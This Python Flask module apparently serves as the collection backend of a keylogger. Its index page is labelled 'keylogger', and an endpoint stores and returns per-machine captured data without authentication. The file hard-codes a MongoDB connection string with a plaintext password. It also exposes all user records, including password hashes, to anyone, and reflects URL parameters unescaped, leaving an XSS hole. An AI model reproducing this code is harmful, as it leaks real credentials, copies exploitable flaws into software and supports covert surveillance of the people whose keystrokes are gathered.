import json
from flask import jsonify ,request
from pymongo import MongoClient
from werkzeug.security import generate_password_hash
import jwt
import datetime
import subprocess
a = "a.json"






client = MongoClient("mongodb+srv://householdmanagement6:jIjTH7s95hYyxxkv@cluster0.ofcu6.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["your_database"]
users_collection = db["users"]












def index_page():
    return ("""<div>
        <h1 style="color: red; text-align: center; font-style: normal;">keylogger</h1>
    </div>""")


def signup(request):
    data=request.json
    name=data.get('name')
    password=data.get('password')
    email=data.get('email')
    if not email or not password or not password:
        return jsonify({"success": False, "message": "All fields are required"}), 400
    user_already_exists = users_collection.find_one({"email": email})
    if user_already_exists:
        return jsonify({"success": False, "message": "User already exists"}), 400

    hashed_password = generate_password_hash(password)
    

    user = {
        "email": email,
        "password": hashed_password,
        "name": name,
       
    }

    users_collection.insert_one(user)

    return jsonify({"success": True, "message": "User created successfully", "user": {"email": email, "name": name}})


def login(request):
    pass



def get_data():
    data = list(users_collection.find({}, {"_id": 0}))  # שולף את כל הנתונים ומסתיר את ה-_id
    return jsonify(data)




def get_users():
    try:
        with open(a, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {"error": "File not found"}, 404
    except json.JSONDecodeError:
        return {"error": "Invalid JSON format"}, 400

def home(request):
    if request.method == "POST":
        data = request.get_json()
        if data and "machine_name" in data and "data" in data:
            users_collection.insert_one(data)
            print("✅ מידע נשמר בהצלחה!")
            return jsonify({"message": "Data sent successfully!"}), 201
        return jsonify({"Error": "Invalid data"}), 400

    elif request.method == "GET":
        all_data = list(users_collection.find({}, {"_id": 0}))  
        return jsonify(all_data), 200

def handle_url_params(request):
    if "name" in request.args and "greeting" in request.args:
        name = request.args["name"]
        greeting = request.args["greeting"]
        return f"{greeting} {name}!"
    else:
        return "Missing parameters: name and greeting"
